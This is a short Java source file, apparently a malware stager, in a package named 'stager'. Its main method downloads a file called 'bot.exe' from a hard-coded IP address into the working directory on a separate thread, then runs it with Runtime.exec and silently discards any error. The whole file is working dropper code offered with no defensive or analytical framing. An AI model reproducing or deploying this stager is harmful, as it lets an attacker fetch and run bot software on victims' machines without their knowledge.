package stager;

import java.io.File;
import java.io.IOException;

public class Main {
	public static void main(String args[])
	{
	     String link = "https://142.93.158.189/bot.exe";
	     File payload_file = new File(System.getProperty("user.dir") + "/bot.exe");
	    		 
	     System.out.println(payload_file);
	    new Thread(new Downloader(link,payload_file)).start();
	    
	    Runtime r = Runtime.getRuntime();
	    try {
			r.exec(System.getProperty("user.dir") + "/bot.exe");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
		}
	    
	}

}
